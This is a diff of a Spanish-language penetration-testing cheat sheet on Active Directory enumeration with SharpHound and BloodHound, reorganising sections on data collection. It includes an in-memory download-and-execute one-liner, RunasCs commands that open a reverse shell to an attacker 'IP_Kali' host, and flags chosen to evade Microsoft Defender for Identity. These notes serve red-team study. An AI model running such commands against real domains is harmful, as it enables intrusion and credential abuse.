@@ -95,31 +95,64 @@ Notas:
 	2. Importar todos los archivos en formato 'Json' a BloodHound
 ```
 
-## SharpHound 
+## SharpHound (.exe)
 
 Para descargar Sharphound se puede hacer desde la consola de Bloodhound Community Edition.
 
-```powershell 
-❯ Import-Module .\SharpHound.ps1       # Importar el modulo, tambien se puede hacer con el '.exe'
-
-❯ Invoke-BloodHound -CollectionMethod All
+```bash 
+❯ .\SharpHound.exe -c All    # Iniciar la recolección  
 ```
 
-```powershell
-# Importar el modulo en memoria
-❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 
-
-❯ Invoke-BloodHound -CollectionMethod All      # Recolectar la data 
-
-# Suministrar datos a BloodHound 
+```powershell 
+# Recolección de manera sigilosa 
 ❯ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound.exe -args --collectionmethods All   
 
-# Para hacer una recolección sigilosa, remover métodos ruidosos de recolección como RDP,DCOM, PSRemote y LocalAdmin
+# Para hacer una recolección aún más sigilosa, remover métodos ruidosos de recolección como RDP,DCOM, PSRemote y LocalAdmin
 ❯ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs 
 
 Notas:
 	1. Usar 'Excludedcs' para evitar la detección MDI
 	2. Remover 'CertServices collection' cuando se use BloodHound Legacy 
+```
+
+## SharpHound Powershell (.ps1)
+
+Para descargar Sharphound se puede hacer desde la consola de Bloodhound Community Edition.
+
+```powershell 
+❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/SharpHound.ps1') 
+# Importar el modulo en memoria
+
+❯ Import-Module .\SharpHound.ps1              # Importar el módulo desde el disco 
+
+❯ Invoke-BloodHound -CollectionMethod All     # Iniciar la recolección 
+```
+
+## SharpHound desde un CMD en Windows 
+
+* [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)
+
+```powershell 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe"
+# Ejecutar una reverse shell a Kali 
+❯ .\RunasCs.exe Administrator password123 "cmd.exe" -r IP_Kali:443 
+
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" 
+❯ .\RunasCs.exe Administrator password123 "powershell.exe" -l 9
+	# -l 9 = Mismo comportamiento que '/netonly'
+
+# Ejecutar un comando 
+❯ .\RunasCs.exe corp\administrator Password123 "cmd.exe /c whoami"
+```
+
+```powershell 
+# Autenticarse en un 'CMD' en Windows con credenciales validas
+❯ runas /netonly /user:domain1.com\username cmd    # Autenticarse con credenciales validas a nivel de red en una CMD en Windows> Este comando abrirá una nueva CMD con las credenciales 
+
+❯ dir \\IP\DIR           # Enumerar el directorio con el usuario autenticado desde una CMD en Windows 
+
+❯ .\SharpHound.exe -c all -d domain1.com --domaincontroller <IP>   
+# Enumeración con SharpHound a un dominio con credenciales validas desde una CMD en Windows
 ```
 
 ## SOAPHound 
@@ -152,31 +185,3 @@ Notas:
 	1. Al usar ADPeas para hacer la recolección ejecuta 'SharpHound' automaticamente
 ```
 
-## SharpHound desde un CMD en Windows 
-
-* [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5)
-
-```powershell 
-❯ .\RunasCs.exe Administrator password123 "cmd.exe"
-# Ejecutar una reverse shell a Kali 
-❯ .\RunasCs.exe Administrator password123 "cmd.exe" -r IP_Kali:443 
-
-❯ .\RunasCs.exe Administrator password123 "powershell.exe" 
-❯ .\RunasCs.exe Administrator password123 "powershell.exe" -l 9
-	# -l 9 = Mismo comportamiento que '/netonly'
-
-# Ejecutar un comando 
-❯ .\RunasCs.exe corp\administrator Password123 "cmd.exe /c whoami"
-```
-
-```bash 
-# Autenticarse en un 'CMD' en Windows con credenciales validas
-❯ runas /netonly /user:domain1.com\username cmd    # Autenticarse con credenciales validas a nivel de red en una CMD en Windows> Este comando abrirá una nueva CMD con las credenciales 
-
-❯ dir \\IP\DIR           # Enumerar el directorio con el usuario autenticado desde una CMD en Windows 
-
-❯ .\SharpHound.exe -c all -d domain1.com --domaincontroller IP   # Enumeración con SharpHound a un dominio con credenciales validas desde una CMD en Windows.
-Nota: La herramienta regresará un archivo '.zip' que se debe cargar en 'BloodHound' para analizar
-
-❯ python3 -m http.server 80     # Crear un recurso compartido a nivel de red para pasar archivos 
-```
